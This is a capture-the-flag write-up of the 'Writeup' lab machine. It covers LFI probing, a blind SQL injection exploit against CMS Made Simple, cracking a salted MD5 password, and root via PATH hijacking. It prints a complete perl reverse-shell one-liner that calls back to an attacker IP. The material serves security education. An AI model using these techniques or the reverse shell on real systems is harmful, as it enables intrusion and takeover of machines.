---
layout: post
title:  Writeup Writeup
description: Yes, this box is called Writeup. This box did not have many open ports and even included a DoS protection script to prevent gobusters. The problem is we had to discover certain directories in order to extract essential information about the web server. Come check out my writeup for Writeup, as you will learn a lot about hashes and enumeration.
date:   2021-03-15 
image:  '/images/Writeup.png'
tags:   [SQLi, Hash Cracking, Enumeration]
---

**This report can be read both on this site, and as its <a href = "https://0xd4y.com/reports/Writeup%20Writeup.pdf">original report form</a>. It is highly recommended that you read the original report form instead because it is better formatted.**

![](/reports/Writeup/image9.png)

What better opportunity to write a writeup than to write a writeup of a box named Writeup? This box made evident the importance of enumeration. The interesting thing about this box is that gobuster would not work due to a DoS protection against 404 http errors. So how would we find the potentially vulnerable web pages of the web server?

Reconnaissance

The first thing that I always do when targeting a box is adding its ip to my /etc/hosts file, because it is easier to remember a hostname than an ip.

![](/reports/Writeup/image38.png)

Let’s start with enumerating the ports of the box nmap -sC -sV -oA nmap/nmap writeup.htb:

![](/reports/Writeup/image24.png)

Looks like there are only two ports running on this box. Because this was a small amount, I ran an nmap scan to enumerate all ports with the -p- flag, but I did not discover any other ports. Looking at the result of the nmap scan, the box is running the Debian Linux distribution (noting information like this is important when trying to understand the makeup of a box). Software can differ depending on the operating system / distribution of a system. Nmap discovered a directory /writeup/ from the robots.txt file. Let’s look at the webpage on http://writeup.htb:

Web Enumeration

![](/reports/Writeup/image8.png)

First time I saw this webpage, I foolishly did a gobuster because I did not read the message in red. As a result, I got banned and had to wait a couple of minutes for my ip to no longer be blacklisted. Looking at the message, we can see that there is a DoS script in place to look for 40x errors (this unfortunately includes 404 errors which we need for gobuster to work). Another potentially important thing to note is the email jkr@writeup.htb. This means that there might be a user jkr on the box (which may or may not come handy). It’s a good habit to note down any potentially important information in a notes.txt file.

Incidentally, because I added the ip to my /etc/hosts file and navigated to the http://writeup.htb page, it is important to check also http://10.10.10.138 to make sure there is no virtual host routing in place (for this box it turns out that there is no vhost routing). Let’s see what is on the /writeup directory:

![](/reports/Writeup/image6.png)

Visiting the writeup writeup, we get the following:

![](/reports/Writeup/image5.png)

There is nothing interesting in this page, or in any of the other pages. However, there is one thing we need to test for. It is possible that the page parameter in the link (http://writeup.htb/writeup/index.phyp?page=writeup) is vulnerable to LFI (local file inclusion). Trying http://writeup.htb/writeup/index.phyp?page=../../../../../../../../../../../../etc/passwd, we get the following output:

![](/reports/Writeup/image31.png)

I tried a couple of other methods for LFI to see if there might be some blacklisted characters, but it seems that the page parameter is not vulnerable.

Blind SQL Injection

At this point I was stuck for a while, but there is a hint at the bottom of the /writeup directory: ![](/reports/Writeup/image15.png)

This was hinting at the fact that this page was created with a web content management system (CMS). We can confirm that by viewing the source:

![](/reports/Writeup/image33.png)

Note the CMS Made Simple line. There might be a CMS exploit we could use, but what is the version? Don’t forget that Google is your friend! Due to CMS Made Simple being open source, we can easily view the content of this CMS and all of its directories. Visiting [http://www.cmsmadesimple.org/downloads/cmsms](https://www.google.com/url?q=http://www.cmsmadesimple.org/downloads/cmsms&sa=D&source=editors&ust=1653884891178100&usg=AOvVaw2INPmOXeqpPu92L_Ba0Fwc), we see a link to their repository: [http://svn.cmsmadesimple.org/svn/cmsmadesimple/trunk](https://www.google.com/url?q=http://svn.cmsmadesimple.org/svn/cmsmadesimple/trunk&sa=D&source=editors&ust=1653884891178603&usg=AOvVaw3aAiGlvZD4VLqL9g6x8Lyz). Browsing to this link, we see all the directories associated with this CMS:

![](/reports/Writeup/image25.png)

As it turns out, most of these files and directories are on the web server. Checking out the admin directory, we can see that it asks for a password:

![](/reports/Writeup/image27.png)

Unfortunately, we do not have any credentials....yet. Let’s check out the /doc directory, as this directory seems like it would have some file that could leak the version of the CMS.

![](/reports/Writeup/image19.png)

The CHANGELOG.txt file seems like it would have the version of the CMS. Let’s visit the /writeup/doc/CHANGELOG.txt path on the web server:

![](/reports/Writeup/image12.png)

 So we see that this web page is running CMS Made Simple version 2.2.9.1. Looking up CMS Made Simple on searchsploit, we are flooded with exploits:

![](/reports/Writeup/image21.png)

There is only one exploit here that looks promising: the SQL Injection exploit for versions < 2.2.10. All other exploits either require credentials or are too old. Let’s mirror this exploit and examine it. The key parts of this exploit is the vulnerable page and payload:

![](/reports/Writeup/image7.png)

![](/reports/Writeup/image28.png)

![](/reports/Writeup/image30.png)

There is a parameter in the News module called m1_idlist that is vulnerable to SQL injection. As we can see from the payload, this script uses a blind SQL injection attack to extract credentials from the affected system. The attack works by asking the server to sleep for a certain period of time if a certain statement is true. So if we find that a request of ours makes the web server take an unusual amount of time to respond to us, then we know that the statement ran true. This means that we could ask the server the following:

Pentester: “Hey web server! You should sleep for 1 second if you have a username in the cms_users table that starts with the letter a.”

Web server: “Hi Pentester! I don’t have a user in my cms_users table that starts with the letter a, so I am not going to sleep for 1 second.”

Pentester: “No problem! You should sleep for 1 second if you have a username in the cms_users table that starts with the letter b.”

Web server: “I actually have a user in my cms_users table that starts with the letter b, so I will sleep for 1 second.”

Pentester: “Okay, so it normally takes the web server to respond to me after 1 second, but now it took the web server two seconds to respond. There is probably a user in the cms_users table that starts with the letter b. Let’s ask the web server another question: ‘Hey web server, it’s me again. You should sleep for 1 second if you have a username in the cms_users table that starts with the letters ba.’”

I think you get the point. Running the exploit with python 46635.py -u http://writeup.htb/writeup we get the hashed credentials of the user jkr:

![](/reports/Writeup/image42.png)

Now all we have to do is crack the hash! Because we have the salt of the hash, we can crack the hash a lot more easily. The hashed password is 32 characters long which suggests that it is an md5 hash. We can use hashcat to crack the password, but this handy exploit even has a cracking function (albeit it is not as fast as hashcat).

Script Method:

![](/reports/Writeup/image17.png)

![](/reports/Writeup/image26.png)

Hashcat Method:

![](/reports/Writeup/image18.png)

Looking at the line above, we can see that the password is hashed by adding the salt and password (note that the line variable refers to a line in the password wordlist). We can conclude that the password is a salted md5sum. Viewing hashcat’s example hashes, we can see the mode that corresponds most to what we are looking for.

![](/reports/Writeup/image1.png)

As you can see, mode 20 looks like the right hash so let’s crack it. Make sure to first put the hash in the format hash:salt as described by the [Hashcat - Example Hashes](https://www.google.com/url?q=https://hashcat.net/wiki/doku.php?id%3Dexample_hashes&sa=D&source=editors&ust=1653884891182023&usg=AOvVaw2YZka0j0imOgS71lDieBP4) page.

![](/reports/Writeup/image40.png)

hashcat -m 20 hash /usr/share/wordlists/rockyou.txt

![](/reports/Writeup/image14.png)

And we get the password for the jkr user as raykayjay9! These credentials did not work for the /admin directory, but nevertheless we can ssh into the box!

![](/reports/Writeup/image34.png)

Incidentally, the purpose of salts is so that multiple hashes in a compromised credential database do not get cracked simultaneously. It is highly likely that in a database of over a million users, many users have the same password. This would mean that two users with the password of 0xd4y would both get cracked easily by use of a [rainbow table](https://www.google.com/url?q=https://en.wikipedia.org/wiki/Rainbow_table&sa=D&source=editors&ust=1653884891182806&usg=AOvVaw0l_PSwYHT1mHo73hJIVbjd).

![](/reports/Writeup/image29.png)

Notice how two users can have the same password of raykayjay9, but their md5sum hashes are different because they have different salt values.

Privilege Escalation to Root

So now that we have a shell, let’s enumerate the box to find any possible attack vectors. I like using the linpeas.sh script, as its output is color-coded and is very easy to read.

![](/reports/Writeup/image4.png)

![](/reports/Writeup/image36.png)

![](/reports/Writeup/image32.png)

![](/reports/Writeup/image16.png)

![](/reports/Writeup/image35.png)

We can see that we have write access to /usr/local/bin and /usr/local/sbin. Furthermore, we are part of the staff group:

![](/reports/Writeup/image23.png)

This is a default group for the Debian distro. The permissions given by being part of the staff group should only be granted to trusted users. Here is why:

![](/reports/Writeup/image20.png)

Commands that you run such as grep are actually just binaries that are stored in some directory on your machine (typically it is stored in /bin):

![](/reports/Writeup/image3.png)

The point of PATHs is so that you don’t have to constantly type /bin/grep whenever you want to run that command (it’s just tedious). An important thing to note is the order of what’s in the $PATH variable. By default, /usr/local/bin comes before /bin. This means that if we made a file and put it in /usr/local/bin, then when we run grep, we are actually running /usr/local/bin/grep and not /bin/grep.

Proof of Concept

![](/reports/Writeup/image11.png)

![](/reports/Writeup/image13.png) ← after logging out and logging back in

![](/reports/Writeup/image22.png)

Note that the user who created a binary in the /usr/local/bin path must logout and log back in for it to affect him. All other users on the box do not need to do that (I am not sure why). This means that in a real scenario, before the command is hijacked, a victim could run a command and it would work just as expected. After it gets hijacked, the victim could run that same command (during the same login session) and the hijacked binary would get executed instead! This is why for the sake of security, it is imperative that high-privileged users execute the full path of commands (especially when it comes to cron jobs). Let’s look for cron jobs running as root. There might be one that is running a command without using its full path. There is a great script on github called [pspy](https://www.google.com/url?q=https://github.com/DominicBreuker/pspy&sa=D&source=editors&ust=1653884891185100&usg=AOvVaw2w7-_BCyKSKMsXly3u3ToU) that actively monitors all processes running on a system. Downloading pspy and running it on the box, we see the following output:

![](/reports/Writeup/image10.png)

When first doing this box, I noticed that whenever I put a binary in the /usr/local/bin path or the /usr/local/sbin path, it would keep getting removed after some time. This cronjob is probably the culprit. I went into this rabbit hole for a long time. I tried using symbolic links to delete files, but it did not work. This privesc was especially difficult for people hacking on private instances (such as myself) because watch what happens when a person logs into jkr:

![](/reports/Writeup/image39.png)

Suddenly, we are met with a whole bunch of commands that don’t use the full path. We have sh, run-parts, and uname. Each of these commands is run by UID=0 which is root. So if we put a reverse shell in one of these binaries and copy it to the /usr/local/bin path, it will get executed and we will have a shell! The bash reverse shell did not work for me, so I used the perl reverse shell:

perl -e 'use Socket;$i="10.10.14.5";$p=9001;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

![](/reports/Writeup/image41.png)

![](/reports/Writeup/image37.png)

This was a fun box! Thank you @jkr for the cool privesc. Also, big thanks to Daniele Scanu, the creator of the SQL injection script. That was probably the most beautiful and user-friendly exploit I have ever used. Last but not least, thanks to you for reading this writeup! I hope you learned not only from the Writeup box, but also from this writeup! Feel free to write me up at [0xd4yWriteups@gmail.com](mailto:0xd4yWriteups@gmail.com) if you have any comments!
